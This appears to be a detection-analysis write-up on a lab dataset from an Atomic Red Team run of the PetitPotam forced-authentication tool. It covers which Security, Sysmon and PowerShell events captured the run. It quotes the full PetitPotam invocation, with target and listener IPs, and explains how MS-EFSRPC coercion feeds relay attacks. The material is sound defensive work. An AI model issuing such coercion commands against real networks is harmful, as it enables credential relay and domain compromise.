# T1187-1: Forced Authentication — PetitPotam

## Technique Context

Forced Authentication (T1187) is a credential access technique where an attacker coerces a target system to authenticate to an attacker-controlled server, capturing NTLM hashes or enabling relay attacks. PetitPotam is a specific exploitation tool that abuses the MS-EFSRPC (Encrypting File System Remote Protocol) to trigger NTLM authentication from Windows systems, including domain controllers. PetitPotam gained significant attention in 2021 as part of Active Directory Certificate Services (ADCS) relay attack chains that could lead to full domain compromise. The tool initiates an RPC connection to the target's EFS service, which then attempts an authentication callback to the attacker's listener. Detection focuses on unexpected EFS RPC calls, anomalous NTLM authentication traffic, and the execution of PetitPotam.exe specifically.

## What This Dataset Contains

With Windows Defender disabled, this dataset captures the PowerShell-wrapped PetitPotam.exe execution from ACME-WS06.acme.local, targeting `10.0.0.3` with a listener at `10.0.0.2`.

**PetitPotam invocation in Security EID 4688:** The full command is recorded: a child PowerShell process spawned with `"powershell.exe" & {& "C:\AtomicRedTeam\atomics\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1; Write-Host "End of PetitPotam attack"}`. The three arguments specify the target server (10.0.0.3), the listener address to which the target should authenticate (10.0.0.2), and the EFS pipe number (1). The `Write-Host "End of PetitPotam attack"` indicates a cleanup confirmation step.

**Sysmon EID 1 confirms the child PowerShell:** The same child PowerShell (PID 17144) is captured with its full command line and file hashes. Both `whoami.exe` executions (PID 18000 and post-test) are captured as SYSTEM-context processes.

**Sysmon EID 17:** Three named pipe creation events capture PowerShell host pipes, consistent with multiple PowerShell processes starting across the test.

**Sysmon EID 10:** Four process access events record PowerShell processes accessing child processes with `GrantedAccess: 0x1FFFFF`.

**DLL loading:** 25 Sysmon EID 7 events reflect extensive .NET and Defender DLL loads across the multiple PowerShell processes in the test window.

**PowerShell EID 4104:** 107 events including the cleanup block `Invoke-AtomicTest T1187 -TestNumbers 1 -Cleanup -Confirm:$false` — confirming the test framework completed.

Compared to the defended dataset (46 Sysmon, 10 Security, 53 PowerShell), this undefended run has fewer events (37 Sysmon, 4 Security, 108 PowerShell). The defended run produced more Sysmon events from Defender's scanning activity; this run has a heavier PowerShell channel (108 vs. 53) because the test framework ran further without blocking. The defended dataset described PetitPotam.exe's process creation as absent from Sysmon EID 1; that gap persists here.

## What This Dataset Does Not Contain

**PetitPotam.exe process creation:** No Sysmon EID 1 event for `PetitPotam.exe` itself appears. The tool runs from `C:\AtomicRedTeam\...\ExternalPayloads\PetitPotam.exe`, which is not a LOLBin and is not matched by the Sysmon-modular include-mode filter rules. Only the parent PowerShell process launching PetitPotam is captured, not PetitPotam's own execution.

**EFS RPC network traffic:** The core behavioral indicator of PetitPotam — an RPC connection to port 445 or the EFS named pipe on the target host (10.0.0.3) — is not captured. No Sysmon EID 3 network connection events appear.

**Authentication coercion events:** If PetitPotam successfully triggered the target to authenticate, the resulting NTLM authentication traffic and potentially a Security EID 4625 (failed logon) or EID 4624 (successful logon) on the listener would appear. Neither is present because the target IP (10.0.0.3) is a test address with no corresponding host in this environment.

**PetitPotam output:** The tool would normally print status messages to stdout confirming whether it successfully triggered the EFS callback. No output capture events are present.

## Assessment

This dataset's detection value is primarily in the process creation chain that launches PetitPotam: Security EID 4688 and Sysmon EID 1 both record the child PowerShell process with the full command line including `PetitPotam.exe` path, target IP, listener IP, and pipe number. This is sufficient to confirm that PetitPotam was invoked, even without seeing PetitPotam.exe's own process creation event.

The absence of PetitPotam.exe in Sysmon EID 1 is a notable gap and represents a realistic scenario: many endpoint detection approaches that rely on process creation matching against known tool names would miss this execution. The command string in the parent PowerShell's command line is the reliable detection anchor.

Compared to the defended variant (which blocked the execution before any network effects), neither dataset contains the network-level evidence of PetitPotam's MS-EFSRPC coercion activity. For building PetitPotam-specific detections that operate on network behavior rather than endpoint telemetry, network-based logging of RPC traffic to port 445 or Windows EFS RPC audit logs on target servers would be required.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** PowerShell spawning child PowerShell with `PetitPotam.exe` in the command line, along with a target IP and listener IP as arguments — highly specific to this tool's invocation pattern
- **PowerShell EID 4104:** Script block logging captures `& "C:\AtomicRedTeam\...\ExternalPayloads\PetitPotam.exe" 10.0.0.3 10.0.0.2 1` — the binary path and argument structure are detectable even without PetitPotam.exe's own process creation event
- **File hash hunting:** The Sysmon-captured hashes for the PowerShell binary and any binaries that did load can be used for process lineage correlation
- **Security EID 4688:** PowerShell running as SYSTEM spawning child PowerShell targeting specific IPs is anomalous; the IP addresses `10.0.0.2` and `10.0.0.3` in a command line on a production workstation would be high-confidence indicators
- **Write-Host string:** The test framework marker `"End of PetitPotam attack"` appears in the PowerShell command line in EID 4688 — not a realistic attacker artifact, but confirms the completion of execution in this dataset
